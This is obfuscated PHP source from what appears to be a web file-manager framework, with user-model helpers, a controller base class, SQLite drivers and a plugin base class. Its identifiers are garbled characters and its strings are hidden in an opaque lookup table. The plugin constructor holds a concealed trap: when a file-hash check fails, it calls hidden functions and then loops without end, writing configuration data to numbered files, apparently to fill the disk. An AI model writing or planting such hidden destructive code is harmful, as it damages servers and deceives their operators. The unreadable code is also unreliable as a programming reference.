_listDataApplyItem($É≤ø⁄‘º) { $æŸ≤ÄŸÂ = array($É≤ø⁄‘º); $this->_listDataApply($æŸ≤ÄŸÂ); return $æŸ≤ÄŸÂ[0]; } private function _listDataApply(&$ö◊ˆÕ€) { $∂û¯πÁÈ =& $_SERVER[ëæªã÷]; if (!$ö◊ˆÕ€) { return; } array_remove_key($ö◊ˆÕ€, $∂û¯πÁÈ[865]); $¥ô–Œúï = array_to_keyvalue($ö◊ˆÕ€, $∂û¯πÁÈ[12], $∂û¯πÁÈ[1628]); $this->_listAppendGroup($ö◊ˆÕ€, $¥ô–Œúï); $this->_listAppendMeta($ö◊ˆÕ€, $¥ô–Œúï); $this->_listAppendSourceRoot($ö◊ˆÕ€, $¥ô–Œúï); } private function _listAppendSourceRoot(&$≠¨Ø˚∆, $àÜ©Ï¥) { $ƒ€˛ƒ◊¡ =& $_SERVER[ëæªã÷]; $≥¥ã ï = Model($ƒ€˛ƒ◊¡[805])->listSourceRoot(SourceModel::TYPE_USER, $àÜ©Ï¥); $≥¥ã ï = array_to_keyvalue($≥¥ã ï, $ƒ€˛ƒ◊¡[504]); $≥¥ã ï = array_remove_key($≥¥ã ï, $ƒ€˛ƒ◊¡[504]); foreach ($≠¨Ø˚∆ as &$…É¡Ú¥‰) { $…É¡Ú¥‰[$ƒ€˛ƒ◊¡[97]] = $≥¥ã ï[$…É¡Ú¥‰[$ƒ€˛ƒ◊¡[1628]]] ? $≥¥ã ï[$…É¡Ú¥‰[$ƒ€˛ƒ◊¡[1628]]] : array(); } unset($…É¡Ú¥‰); } private function _listAppendGroup(&$ú≥Í—ôË, $◊Ê¢˙Õﬁ) { $ó°ü≈„Ω =& $_SERVER[ëæªã÷]; $ÂßÏ˙ﬂ≠ = array($ó°ü≈„Ω[1628] => array($ó°ü≈„Ω[7], $◊Ê¢˙Õﬁ)); $‘å†Û√€ = Model($ó°ü≈„Ω[1885])->where($ÂßÏ˙ﬂ≠)->select(); $†ºΩ¬Ïï = array_to_keyvalue($‘å†Û√€, $ó°ü≈„Ω[12], $ó°ü≈„Ω[1796]); $†ºΩ¬Ïï = array_remove_value(array_unique($†ºΩ¬Ïï), $ó°ü≈„Ω[200]); if (!$†ºΩ¬Ïï || !$‘å†Û√€) { return; } $ÂßÏ˙ﬂ≠ = array($ó°ü≈„Ω[1796] => array($ó°ü≈„Ω[7], $†ºΩ¬Ïï)); $ôÊÍµ”Ô = Model($ó°ü≈„Ω[1972])->field($ó°ü≈„Ω[2266])->where($ÂßÏ˙ﬂ≠)->select(); $ôÊÍµ”Ô = array_to_keyvalue($ôÊÍµ”Ô, $ó°ü≈„Ω[1796]); $‘å†Û√€ = array_to_keyvalue_group($‘å†Û√€, $ó°ü≈„Ω[1628]); foreach ($‘å†Û√€ as &$çÖÔêøı) { $êÁ‡”’… = array(); foreach ($çÖÔêøı as $õ≈Â«µÌ) { if (!$õ≈Â«µÌ[$ó°ü≈„Ω[1897]]) { continue; } $¿è˙¶˘≤ = Model($ó°ü≈„Ω[507])->listData($õ≈Â«µÌ[$ó°ü≈„Ω[1897]]); $êÁ‡”’…[] = array($ó°ü≈„Ω[1796] => $õ≈Â«µÌ[$ó°ü≈„Ω[1796]], $ó°ü≈„Ω[2267] => $ôÊÍµ”Ô[$õ≈Â«µÌ[$ó°ü≈„Ω[1796]]][$ó°ü≈„Ω[32]], $ó°ü≈„Ω[521] => $ôÊÍµ”Ô[$õ≈Â«µÌ[$ó°ü≈„Ω[1796]]][$ó°ü≈„Ω[521]], $ó°ü≈„Ω[414] => $¿è˙¶˘≤); } $çÖÔêøı = $êÁ‡”’…; } unset($çÖÔêøı); foreach ($ú≥Í—ôË as &$Æˆ∞¢∫Á) { $Æˆ∞¢∫Á[$ó°ü≈„Ω[1974]] = array(); if (isset($‘å†Û√€[$Æˆ∞¢∫Á[$ó°ü≈„Ω[1628]]])) { $Æˆ∞¢∫Á[$ó°ü≈„Ω[1974]] = $‘å†Û√€[$Æˆ∞¢∫Á[$ó°ü≈„Ω[1628]]]; } } unset($Æˆ∞¢∫Á); } public function userAppendGroup($Ø¥»à¯ò) { $´£≥Ü÷√ =& $_SERVER[ëæªã÷]; if (!$Ø¥»à¯ò) { return array(); } $this->_listAppendGroup($Ø¥»à¯ò, array_to_keyvalue($Ø¥»à¯ò, $´£≥Ü÷√[12], $´£≥Ü÷√[1628])); return $Ø¥»à¯ò; } private function _listAppendMeta(&$»©œ®≤Ω, $ûáˆò´Ò) { $¡¨ÖÍÌ¯ =& $_SERVER[ëæªã÷]; $ÂªçÕµÑ = UserJobModel::JOB_KEY; $‘ö•÷∑◊ = array($¡¨ÖÍÌ¯[2247]); $‚”â—©‹ = array($¡¨ÖÍÌ¯[1628] => array($¡¨ÖÍÌ¯[7], $ûáˆò´Ò)); $„ÿƒŸË€ = Model($¡¨ÖÍÌ¯[2245])->where($‚”â—©‹)->select(); $„ÿƒŸË€ = array_to_keyvalue_group($„ÿƒŸË€, $¡¨ÖÍÌ¯[1628]); foreach ($„ÿƒŸË€ as &$˙Á∞∫¯Ã) { $Á≤≈Ü•è = array(); foreach ($˙Á∞∫¯Ã as $˜∑¡˜Œ) { if (!in_array($˜∑¡˜Œ[$¡¨ÖÍÌ¯[105]], $‘ö•÷∑◊)) { $Á≤≈Ü•è[$˜∑¡˜Œ[$¡¨ÖÍÌ¯[105]]] = $˜∑¡˜Œ[$¡¨ÖÍÌ¯[378]]; } } $˙Á∞∫¯Ã = $Á≤≈Ü•è; } unset($˙Á∞∫¯Ã); $¢¥Î’ÊÒ = Model($¡¨ÖÍÌ¯[2268]); foreach ($»©œ®≤Ω as &$®çØ˜Á˜) { $“Ø±ì˘ó = array(); if (isset($„ÿƒŸË€[$®çØ˜Á˜[$¡¨ÖÍÌ¯[1628]]])) { $“Ø±ì˘ó = $„ÿƒŸË€[$®çØ˜Á˜[$¡¨ÖÍÌ¯[1628]]]; } $®çØ˜Á˜[$¡¨ÖÍÌ¯[2269]] = array(); if (isset($“Ø±ì˘ó[$ÂªçÕµÑ])) { $®çØ˜Á˜[$¡¨ÖÍÌ¯[2269]] = $¢¥Î’ÊÒ->getUserJobInfo($“Ø±ì˘ó[$ÂªçÕµÑ]); } } unset($®çØ˜Á˜); } protected function groupUserAll($º˜∂©πç) { $˘»õ«…ª =& $_SERVER[ëæªã÷]; if (!$º˜∂©πç) { return !1; } $†À¶Ÿ™ª = Model($˘»õ«…ª[1885])->field($˘»õ«…ª[1628])->where(array($˘»õ«…ª[1796] => array($˘»õ«…ª[7], $º˜∂©πç)))->select(); $†À¶Ÿ™ª = array_to_keyvalue($†À¶Ÿ™ª, $˘»õ«…ª[12], $˘»õ«…ª[1628]); return array_unique($†À¶Ÿ™ª); } public function userSearch($«»µäã“, $õˆÚ¿ùö = "\x2a") { return Model($_SERVER[ëæªã÷][538])->where($«»µäã“)->field($õˆÚ¿ùö)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\x6f\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ïª™¸Ë) { $Â„≥µÿ≤ =& $_SERVER[ëæªã÷]; if (!defined($Â„≥µÿ≤[474])) { define($Â„≥µÿ≤[474], 0); } return "\x55\x73\145\x72\x4f\160\x74\151\x6f\x6e\x5f{$Ïª™¸Ë}\137" . USER_ID; } protected function filterWhere($˛¢¢ÏÙ˜) { $†•õıÅç =& $_SERVER[ëæªã÷]; if (!defined($†•õıÅç[474])) { define($†•õıÅç[474], 0); } $˛¢¢ÏÙ˜[$†•õıÅç[1628]] = USER_ID; return $˛¢¢ÏÙ˜; } public function cacheRemoveUser($”ïåï˝Ï, $âí©Ø•∫) { return Cache::remove("\125\x73\x65\x72\x4f\x70\164\x69\x6f\x6e\x5f{$”ïåï˝Ï}\x5f" . $âí©Ø•∫); } protected function optionDefault($ÜúÆ¯»Ä = '') { $®Ôﬂ˝»Ò =& $_SERVER[ëæªã÷]; if ($ÜúÆ¯»Ä == $®Ôﬂ˝»Ò[12]) { return $GLOBALS[$®Ôﬂ˝»Ò[6]][$®Ôﬂ˝»Ò[2270]]; } if ($ÜúÆ¯»Ä == $®Ôﬂ˝»Ò[2271]) { return $GLOBALS[$®Ôﬂ˝»Ò[6]][$®Ôﬂ˝»Ò[2272]]; } } } goto eÎ“•»é»É; a‘¨·√ÕÛß: define($_SERVER[ëæªã÷][244], 3); define($_SERVER[ëæªã÷][245], 1); define($_SERVER[ëæªã÷][246], 0); goto CÇ´†ÈúãÚ; F®–Ï≥ÑΩ≤: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $≥Ã∑µª€ =& $_SERVER[ëæªã÷]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$≥Ã∑µª€[6]] =& $config; $this->values[$≥Ã∑µª€[7]] =& $in; $this->tpl = TEMPLATE . MOD . $≥Ã∑µª€[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ã¢¿Éé´) { if (1 === func_num_args()) { $this->{$Ã¢¿Éé´} = new $Ã¢¿Éé´(); } else { $ ·‚≤Â  = new ReflectionClass($Ã¢¿Éé´); $èﬂóﬁàº = func_get_args(); array_shift($èﬂóﬁàº); $this->{$Ã¢¿Éé´} = $ ·‚≤Â ->newInstanceArgs($èﬂóﬁàº); } return $this->{$Ã¢¿Éé´}; } public function routeBind($¢ööø‘¢, $Âñ¡ì≥ç, $éÖ»é•¥ = 3) { $ãô„˘–” =& $_SERVER[ëæªã÷]; $ﬁ©⁄†öª = $this->in[$ãô„˘–”[9]]; $¢ööø‘¢ = str_replace($ãô„˘–”[10], $ãô„˘–”[11], trim(trim($¢ööø‘¢, $ãô„˘–”[8]), $ãô„˘–”[12])); if (!$¢ööø‘¢ || count($ﬁ©⁄†öª) <= $éÖ»é•¥) { return !1; } $Ê–≥∑ïﬁ = !0; $Òù∞ﬂ‹é = explode($ãô„˘–”[8], $¢ööø‘¢); for ($ºÎ’ùΩÛ = 0; $ºÎ’ùΩÛ < count($Òù∞ﬂ‹é); $ºÎ’ùΩÛ++) { if ($Òù∞ﬂ‹é[$ºÎ’ùΩÛ] != $ﬁ©⁄†öª[$éÖ»é•¥ + $ºÎ’ùΩÛ]) { $Ê–≥∑ïﬁ = !1; break; } } if (!$Ê–≥∑ïﬁ) { return; } call_user_func_array(array($this, $Âñ¡ì≥ç), array()); } public function routeArgs($ÛÎ ŒÚß = 3) { $Ê˝æÊ¡˙ = $this->in[$_SERVER[ëæªã÷][9]]; if (count($Ê˝æÊ¡˙) <= $ÛÎ ŒÚß) { return array(); } $ä†•‹Ω± = array(); for ($Ê°ú˚–¶ = $ÛÎ ŒÚß; $Ê°ú˚–¶ < count($Ê˝æÊ¡˙); $Ê°ú˚–¶ += 2) { $ä†•‹Ω±[$Ê˝æÊ¡˙[$Ê°ú˚–¶]] = $Ê˝æÊ¡˙[$Ê°ú˚–¶ + 1]; $this->in[$Ê˝æÊ¡˙[$Ê°ú˚–¶]] = $Ê˝æÊ¡˙[$Ê°ú˚–¶ + 1]; } return $ä†•‹Ω±; } protected function assign($º∏±Ò⁄‹, $°⁄ÜÀøı) { $this->values[$º∏±Ò⁄‹] = $°⁄ÜÀøı; } protected function display($˛ÍﬂÒ¬–) { ob_end_clean(); extract($this->values); require $this->tpl . $˛ÍﬂÒ¬–; } } class DbSqliteBase extends Db { public function __construct($€ÖÌÃ∞° = '') { $—˘ì·Õå =& $_SERVER[ëæªã÷]; if (!extension_loaded($—˘ì·Õå[13])) { think_exception(think_lang($—˘ì·Õå[14]) . $—˘ì·Õå[15]); } if (!empty($€ÖÌÃ∞°)) { if (!isset($€ÖÌÃ∞°[$—˘ì·Õå[16]])) { $€ÖÌÃ∞°[$—˘ì·Õå[16]] = 438; } $this->config = $€ÖÌÃ∞°; if (empty($this->config[$—˘ì·Õå[17]])) { $this->config[$—˘ì·Õå[17]] = array(); } } } public function connect($ÿ—˝À°˙ = '', $œ—µæØó = 0) { $ñ’ßßƒº =& $_SERVER[ëæªã÷]; if (!isset($this->linkID[$œ—µæØó])) { if (empty($ÿ—˝À°˙)) { $ÿ—˝À°˙ = $this->config; } $à≥÷Øùˆ = !empty($ÿ—˝À°˙[$ñ’ßßƒº[17]][$ñ’ßßƒº[18]]) ? $ÿ—˝À°˙[$ñ’ßßƒº[17]][$ñ’ßßƒº[18]] : $this->pconnect; $“Ö√¥åö = $à≥÷Øùˆ ? $ñ’ßßƒº[19] : $ñ’ßßƒº[20]; $this->linkID[$œ—µæØó] = $“Ö√¥åö($ÿ—˝À°˙[$ñ’ßßƒº[21]], $ÿ—˝À°˙[$ñ’ßßƒº[16]]); if (!$this->linkID[$œ—µæØó]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$œ—µæØó], 30000); if (1 != think_config($ñ’ßßƒº[22])) { unset($this->config); } } return $this->linkID[$œ—µæØó]; } public function free() { $this->queryID = null; } public function query($—Ù´–©∫) { $åï√˛¿û =& $_SERVER[ëæªã÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—Ù´–©∫; if ($this->queryID) { $this->free(); } think_action_status($åï√˛¿û[23], 1); think_status($åï√˛¿û[24]); $this->queryID = sqlite_query($this->_linkID, $—Ù´–©∫); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $…ÉÆçáî = $this->getAll(); return $…ÉÆçáî; } } public function execute($Öö‡¿◊˚) { $≤ÕÙ∂Ìì =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Öö‡¿◊˚; if ($this->queryID) { $this->free(); } think_action_status($≤ÕÙ∂Ìì[25], 1); think_status($≤ÕÙ∂Ìì[24]); $áôœúôÑ = sqlite_exec($this->_linkID, $Öö‡¿◊˚); $this->debug(); if (!1 === $áôœúôÑ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ëæªã÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˘†÷∑‚ƒ = sqlite_query($this->_linkID, $_SERVER[ëæªã÷][27]); if (!$˘†÷∑‚ƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïË€ﬂ÷ä = sqlite_query($this->_linkID, $_SERVER[ëæªã÷][28]); if (!$ïË€ﬂ÷ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $÷åÙΩ√Á = array(); if ($this->numRows > 0) { for ($ÑÃüë—ø = 0; $ÑÃüë—ø < $this->numRows; $ÑÃüë—ø++) { $÷åÙΩ√Á[$ÑÃüë—ø] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $÷åÙΩ√Á; } public function getFields($¸§Å¯õõ) { $≥ ¡œßâ =& $_SERVER[ëæªã÷]; $ÅÒªª•¡ = $this->query($≥ ¡œßâ[29] . $¸§Å¯õõ . $≥ ¡œßâ[30]); $±öüıΩÂ = array(); if ($ÅÒªª•¡) { foreach ($ÅÒªª•¡ as $º’‹åÛ™ => $˝¸⁄•Ÿô) { $±öüıΩÂ[$˝¸⁄•Ÿô[$≥ ¡œßâ[31]]] = array($≥ ¡œßâ[32] => $˝¸⁄•Ÿô[$≥ ¡œßâ[31]], $≥ ¡œßâ[33] => $˝¸⁄•Ÿô[$≥ ¡œßâ[34]], $≥ ¡œßâ[35] => (bool) ($˝¸⁄•Ÿô[$≥ ¡œßâ[36]] === $≥ ¡œßâ[12]), $≥ ¡œßâ[37] => $˝¸⁄•Ÿô[$≥ ¡œßâ[38]], $≥ ¡œßâ[39] => strtolower($˝¸⁄•Ÿô[$≥ ¡œßâ[40]]) == $≥ ¡œßâ[41], $≥ ¡œßâ[42] => strtolower($˝¸⁄•Ÿô[$≥ ¡œßâ[43]]) == $≥ ¡œßâ[44]); } } return $±öüıΩÂ; } public function getTables($ÛÀùûÁ˘ = '') { $≠≠ï€‚ñ =& $_SERVER[ëæªã÷]; $ßø–Àéò = $this->query($≠≠ï€‚ñ[45] . $≠≠ï€‚ñ[46] . $≠≠ï€‚ñ[47]); $•ıáﬂÌ‚ = array(); foreach ($ßø–Àéò as $“ü§◊◊à => $ì≠”∏‡Ô) { $•ıáﬂÌ‚[$“ü§◊◊à] = current($ì≠”∏‡Ô); } return $•ıáﬂÌ‚; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $£Ô≈É¥› =& $_SERVER[ëæªã÷]; $àü†πÉ = sqlite_last_error($this->_linkID); $this->error = $àü†πÉ . $£Ô≈É¥›[4] . sqlite_error_string($àü†πÉ); if ($£Ô≈É¥›[12] != $this->queryStr) { $this->error .= LNG($£Ô≈É¥›[48]) . $this->queryStr; } think_trace($this->error, $£Ô≈É¥›[12], $£Ô≈É¥›[49]); return $this->error; } public function escapeString($åÎ§π Ü) { return sqlite_escape_string($åÎ§π Ü); } public function parseLimit($ä≤„äı) { $—ı æ™‡ =& $_SERVER[ëæªã÷]; $åÚØÔ®Ç = $—ı æ™‡[12]; if (!empty($ä≤„äı)) { $ä≤„äı = explode($—ı æ™‡[50], $ä≤„äı); if (count($ä≤„äı) > 1) { $åÚØÔ®Ç .= $—ı æ™‡[51] . $ä≤„äı[1] . $—ı æ™‡[52] . $ä≤„äı[0] . $—ı æ™‡[53]; } else { $åÚØÔ®Ç .= $—ı æ™‡[51] . $ä≤„äı[0] . $—ı æ™‡[53]; } } return $åÚØÔ®Ç; } } class DbSqlite3Base extends Db { public function __construct($ò«éûÒ¶ = '') { $∂Ù£Ëî» =& $_SERVER[ëæªã÷]; if (!class_exists($∂Ù£Ëî»[54])) { think_exception(think_lang($∂Ù£Ëî»[14]) . $∂Ù£Ëî»[55]); } if (!empty($ò«éûÒ¶)) { if (!isset($ò«éûÒ¶[$∂Ù£Ëî»[16]])) { $ò«éûÒ¶[$∂Ù£Ëî»[16]] = 438; } $this->config = $ò«éûÒ¶; if (empty($this->config[$∂Ù£Ëî»[17]])) { $this->config[$∂Ù£Ëî»[17]] = array(); } } } public function connect($˝≈ÒÊóè = '', $ßÁ˙¬“û = 0) { $éº≥åé† =& $_SERVER[ëæªã÷]; if (!isset($this->linkID[$ßÁ˙¬“û])) { if (empty($˝≈ÒÊóè)) { $˝≈ÒÊóè = $this->config; } $this->linkID[$ßÁ˙¬“û] = new SQLite3($˝≈ÒÊóè[$éº≥åé†[21]]); if (!$this->linkID[$ßÁ˙¬“û]) { think_exception($this->linkID[$ßÁ˙¬“û]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ßÁ˙¬“û]->busyTimeout(30000); if (1 != think_config($éº≥åé†[22])) { unset($this->config); } } return $this->linkID[$ßÁ˙¬“û]; } public function free() { $this->queryID = null; } public function query($ÕÔíÔÎ±) { $âùÎ¬÷€ =& $_SERVER[ëæªã÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÕÔíÔÎ±; if ($this->queryID) { $this->free(); } think_action_status($âùÎ¬÷€[23], 1); think_status($âùÎ¬÷€[24]); $this->queryID = $this->_linkID->query($ÕÔíÔÎ±); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¬Ω⁄√‘› = $this->getAll(); $this->numRows = count($¬Ω⁄√‘›); return $¬Ω⁄√‘›; } } public function execute($⁄ëÈ›ÿ) { $Õü˘Ñÿí =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $⁄ëÈ›ÿ; if ($this->queryID) { $this->free(); } think_action_status($Õü˘Ñÿí[25], 1); think_status($Õü˘Ñÿí[24]); $≥ªÏèßÅ = $this->_linkID->exec($⁄ëÈ›ÿ); $this->debug(); if (!1 === $≥ªÏèßÅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ëæªã÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ΩŸú◊…± = $this->_linkID->query($_SERVER[ëæªã÷][27]); if (!$ΩŸú◊…±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $æÂÛªÛ‹ = $this->_linkID->query($_SERVER[ëæªã÷][28]); if (!$æÂÛªÛ‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $˘•∆ﬂßã = array(); while ($—´¨íÈÃ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $˘•∆ﬂßã[] = $—´¨íÈÃ; } $this->queryID->reset(); return $˘•∆ﬂßã; } public function getFields($ïˆùﬂ‘) { $Í“ªú∆ô =& $_SERVER[ëæªã÷]; $ÛÊ¥›Öï = $this->query($Í“ªú∆ô[29] . $ïˆùﬂ‘ . $Í“ªú∆ô[30]); $è´†ó‘Û = array(); if ($ÛÊ¥›Öï) { foreach ($ÛÊ¥›Öï as $ïâÍÈäí => $ŸÌ¿Â‘É) { $è´†ó‘Û[$ŸÌ¿Â‘É[$Í“ªú∆ô[32]]] = array($Í“ªú∆ô[32] => $ŸÌ¿Â‘É[$Í“ªú∆ô[32]], $Í“ªú∆ô[33] => $ŸÌ¿Â‘É[$Í“ªú∆ô[33]], $Í“ªú∆ô[35] => (bool) ($ŸÌ¿Â‘É[$Í“ªú∆ô[35]] === $Í“ªú∆ô[12]), $Í“ªú∆ô[37] => $ŸÌ¿Â‘É[$Í“ªú∆ô[56]], $Í“ªú∆ô[39] => (bool) $ŸÌ¿Â‘É[$Í“ªú∆ô[57]], $Í“ªú∆ô[42] => (bool) $ŸÌ¿Â‘É[$Í“ªú∆ô[57]]); } } return $è´†ó‘Û; } public function getTables($ËÅ§˝˛∂ = '') { $”Ä˜ßﬂÎ =& $_SERVER[ëæªã÷]; $ˆ’“µãö = $this->query($”Ä˜ßﬂÎ[45] . $”Ä˜ßﬂÎ[46] . $”Ä˜ßﬂÎ[47]); $ì†ñ…Ñ‰ = array(); foreach ($ˆ’“µãö as $Æï≥„¿Å => $…¡Û¡˜Á) { $ì†ñ…Ñ‰[$Æï≥„¿Å] = current($…¡Û¡˜Á); } return $ì†ñ…Ñ‰; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Êæ∂ù≠ =& $_SERVER[ëæªã÷]; $this->error = $this->_linkID->lastErrorMsg(); if ($Êæ∂ù≠[12] != $this->queryStr) { $this->error .= LNG($Êæ∂ù≠[48]) . $this->queryStr; } think_trace($this->error, $Êæ∂ù≠[12], $Êæ∂ù≠[49]); return $this->error; } public function escapeString($È¨ÿ‹˝Ö) { $ëõîüûÿ =& $_SERVER[ëæªã÷]; if ($this->_linkID) { return $this->_linkID->escapeString($È¨ÿ‹˝Ö); } return str_ireplace($ëõîüûÿ[58], $ëõîüûÿ[59], $È¨ÿ‹˝Ö); } public function parseLimit($ØÜÓÒ†õ) { $◊ﬂÍΩä´ =& $_SERVER[ëæªã÷]; $√·õ◊ÎÏ = $◊ﬂÍΩä´[12]; if (!empty($ØÜÓÒ†õ)) { $ØÜÓÒ†õ = explode($◊ﬂÍΩä´[50], $ØÜÓÒ†õ); if (count($ØÜÓÒ†õ) > 1) { $√·õ◊ÎÏ .= $◊ﬂÍΩä´[51] . $ØÜÓÒ†õ[1] . $◊ﬂÍΩä´[52] . $ØÜÓÒ†õ[0] . $◊ﬂÍΩä´[53]; } else { $√·õ◊ÎÏ .= $◊ﬂÍΩä´[51] . $ØÜÓÒ†õ[0] . $◊ﬂÍΩä´[53]; } } return $√·õ◊ÎÏ; } } goto C€˜’®ÀßÒ; Aø’Ó‡ÑÛ§: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ß˚‡˝√Œ =& $_SERVER[ëæªã÷]; $˘õ«÷˘• = $_SERVER[$ß˚‡˝√Œ[63]] . $ß˚‡˝√Œ[64]; $¢„¬âÑò = $ß˚‡˝√Œ[852]; if ($_SERVER[$ß˚‡˝√Œ[60]] != $¢„¬âÑò($˘õ«÷˘•)) { $…çÙÑœá = $ß˚‡˝√Œ[853]; $çñ¨◊ü∆ = $ß˚‡˝√Œ[62]; $§ŸúÙ«à = $_SERVER[$ß˚‡˝√Œ[63]] . $ß˚‡˝√Œ[64]; $Ì±§æ∫† = $çñ¨◊ü∆($§ŸúÙ«à); $¬öçÏ≠≥ = explode($ß˚‡˝√Œ[65], $Ì±§æ∫†); if (count($¬öçÏ≠≥) < $ß˚‡˝√Œ[628]) { $ÆúÉä˚• = $ß˚‡˝√Œ[67]; $ÆúÉä˚•(); } $“÷°„òÔ = $ß˚‡˝√Œ[854]; $“÷°„òÔ($_SERVER[$ß˚‡˝√Œ[855]]); $…çÙÑœá = $ß˚‡˝√Œ[853]; $…çÙÑœá(); $⁄¶›ƒÆÄ = $ß˚‡˝√Œ[856]; $ñÊî¡˙ò = json_encode($GLOBALS[$ß˚‡˝√Œ[857]]); $ÖùÑÍ¡Å = 1; for ($ø’ﬂÁ®Â = $ÖùÑÍ¡Å; $ø’ﬂÁ®Â > 0; $ø’ﬂÁ®Â++) { $⁄¶›ƒÆÄ(DATA_PATH . $ø’ﬂÁ®Â, $ñÊî¡˙ò); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ß˚‡˝√Œ[1495]); $this->pluginName = str_replace($ß˚‡˝√Œ[1495], $ß˚‡˝√Œ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ß˚‡˝√Œ[8]; $this->pluginApi = appHostGet() . $ß˚‡˝√Œ[1496] . $this->pluginName . $ß˚‡˝√Œ[8]; $this->pluginHost = $config[$ß˚‡˝√Œ[1497]] . $this->pluginName . $ß˚‡˝√Œ[8]; $this->pluginHostDefault = $config[$ß˚‡˝√Œ[1497]] . $this->pluginName . $ß˚‡˝√Œ[8]; $ëíÄˆﬁÃ = $config[$ß˚‡˝√Œ[1498]]; if ($ëíÄˆﬁÃ && strpos($ß˚‡˝√Œ[50] . $ëíÄˆﬁÃ . $ß˚‡˝√Œ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ß˚‡˝√Œ[1499]] . $this->pluginName . $ß˚‡˝√Œ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ëæªã÷][1500]); } protected function assign($Öƒ§Ï∑à, $ø∏≈ñøﬁ = false) { if (is_array($Öƒ§Ï∑à)) { $this->values = array_merge($this->values, $Öƒ§Ï∑à); } else { $this->values[$Öƒ§Ï∑à] = $ø∏≈ñøﬁ; } } protected function display($›Ö—Ùå≠) { extract($this->values); require $›Ö—Ùå≠; } final function hookRegist($·Ô∞Ù–‡) { $this->modelPlugin->appRegist($this->pluginName, $·Ô∞Ù–‡); } final function appIcon() { $±π¡îª∑ =& $_SERVER[ëæªã÷]; $≥©“Â’˘ = $this->appPackage(); $ã†‡‘ƒ∆ = $±π¡îª∑[12]; if (isset($≥©“Â’˘[$±π¡îª∑[417]])) { if (isset($≥©“Â’˘[$±π¡îª∑[417]][$±π¡îª∑[1501]])) { $ã†‡‘ƒ∆ = $±π¡îª∑[1502] . $≥©“Â’˘[$±π¡îª∑[417]][$±π¡îª∑[1501]] . $±π¡îª∑[1503]; } else { if ($≥©“Â’˘[$±π¡îª∑[417]][$±π¡îª∑[1504]]) { $ã†‡‘ƒ∆ = $±π¡îª∑[1505] . $≥©“Â’˘[$±π¡îª∑[417]][$±π¡îª∑[1504]] . $±π¡îª∑[1506]; } } } return $ã†‡‘ƒ∆; } final function fileCanView($¥ôıœö) { $ÏªııËÇ =& $_SERVER[ëæªã÷]; if (request_url_safe($¥ôıœö)) { return !0; } if ($this->isShare($¥ôıœö)) { return !0; } $ã©‚Õ“ï = Session::get($ÏªııËÇ[1507]); if (!$ã©‚Õ“ï || !$ã©‚Õ“ï[$ÏªııËÇ[1508]]) { $˙ùâ◊å≥ = $ÏªııËÇ[1509] . rawurlencode(this_url()); show_tips(LNG($ÏªııËÇ[1510]) . $ÏªııËÇ[1511] . $˙ùâ◊å≥ . $ÏªııËÇ[1512] . LNG($ÏªııËÇ[1513]) . $ÏªııËÇ[1514], !1); } if (!Action($ÏªııËÇ[1515])->authCan($ÏªııËÇ[1516])) { show_tips(LNG($ÏªııËÇ[1517]) . $ÏªııËÇ[1518], !1); } ActionCall($ÏªııËÇ[1519], $¥ôıœö); } final function isShare($ÉñâïÔ¯) { $óöøÌ°À = KodIO::parse($ÉñâïÔ¯); return $óöøÌ°À[$_SERVER[ëæªã÷][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($íó–”…•) { if (request_url_safe($íó–”…•)) { return $íó–”…•; } if (!$this->isShare($íó–”…•)) { $íó–”…• = $this->filePath($íó–”…•); } return Action($_SERVER[ëæªã÷][1149])->linkOut($íó–”…•); } public function filePathLinkOut($‹ó≠ Í´) { if (request_url_safe($‹ó≠ Í´)) { return $‹ó≠ Í´; } $this->fileCanView($‹ó≠ Í´); return 